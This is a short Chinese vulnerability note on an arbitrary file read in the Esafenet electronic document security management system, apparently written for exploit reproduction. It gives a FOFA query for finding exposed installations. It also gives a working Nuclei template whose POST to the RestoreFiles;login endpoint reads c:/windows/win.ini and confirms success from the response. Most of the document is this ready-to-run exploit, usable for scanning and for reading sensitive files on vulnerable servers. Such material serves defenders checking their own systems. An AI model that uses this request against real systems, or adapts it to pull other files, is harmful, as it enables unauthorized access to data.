# 亿赛通-文件读取restorefiles-login

### <font style="color:rgba(0, 0, 0, 0.85);">漏洞描述</font>
<font style="color:rgb(119, 119, 119);">亿赛通电子文档安全管理系统 restorefiles-login 文件读取,攻击者可通过此漏洞敏感信息。</font>

### <font style="color:rgba(0, 0, 0, 0.85);">漏洞复现</font>
<font style="color:rgb(119, 119, 119);">1、fofa</font>

```plain
app="亿赛通-电子文档安全管理系统"
```

<font style="color:rgb(119, 119, 119);">3、隐患url，验证如下</font>

```plain
id: yst-fileread

info:
  name: yst-fileread
  author: xxxx
  severity: high

http:
  - raw:
	  - |
		POST /CDGServer3/document/RestoreFiles;login HTTP/1.1
		Host: {{Hostname}}
		User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
		Connection: close
		Content-Length: 68
		Content-Type: application/x-www-form-urlencoded
		Accept-Encoding: gzip

		command=DownloadDoc&fileNameForDownload=&downPath=c:/windows/win.ini

	matchers:
	  - type: dsl
		dsl:
		  - status_code==200 && contains_all(body+all_headers,"[fonts]","attachment;filename")
```
